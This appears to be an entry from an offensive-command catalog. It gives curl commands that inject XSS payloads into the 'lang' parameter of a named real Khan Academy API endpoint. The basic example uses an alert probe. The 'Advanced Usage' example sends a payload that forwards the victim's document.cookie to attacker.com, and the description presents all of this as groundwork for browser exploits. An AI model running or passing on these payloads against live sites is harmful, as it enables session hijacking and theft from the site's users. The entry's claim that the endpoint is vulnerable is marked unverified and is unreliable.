---
id: cmd-curl-xss-khan
data: >-
  curl -G
  "https://www.khanacademy.org/api/internal/_mt/user/videos/VIVIegSt81k/log_compatibility"
  --data-urlencode "lang=en<script>alert('XSS')</script>"
tags:
  - xss
  - injection
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:30.480Z'
verified: false
validated: true
submitted: true
---
# curl-xss-injection-khan

## Command

```bash
curl -G "https://www.khanacademy.org/api/internal/_mt/user/videos/VIVIegSt81k/log_compatibility" --data-urlencode "lang=en<script>alert('XSS')</script>"
```

## Description

This curl command sends a GET request to the vulnerable Khan Academy API endpoint, URL-encoding the 'lang' parameter with an XSS payload to test for script injection via content-sniffing. Use it to verify reflection before crafting browser-executable exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-G` | Treats subsequent parameters as part of the query string | Yes |
| `--data-urlencode` | URL-encodes the lang parameter with payload | Yes |
| `lang=...` | The vulnerable parameter with injected <script> | Yes |

## Examples

### Basic Usage

```bash
curl -G "https://www.khanacademy.org/api/internal/_mt/user/videos/VIVIegSt81k/log_compatibility" --data-urlencode "lang=en<script>alert('XSS')</script>"
```

### Advanced Usage

```bash
curl -G "https://www.khanacademy.org/api/internal/_mt/user/videos/VIVIegSt81k/log_compatibility" --data-urlencode "lang=en<script>document.location='http://attacker.com?'+document.cookie</script>" -v
```

## Expected Output

HTTP response body containing the reflected payload, e.g., JSON or HTML with <script>alert('XSS')</script> visible, indicating successful injection. No alert in curl, but confirms reflection for browser testing.

## Related

- [[Related Procedure: Inject-XSS-Payload-into-Lang-Parameter]]
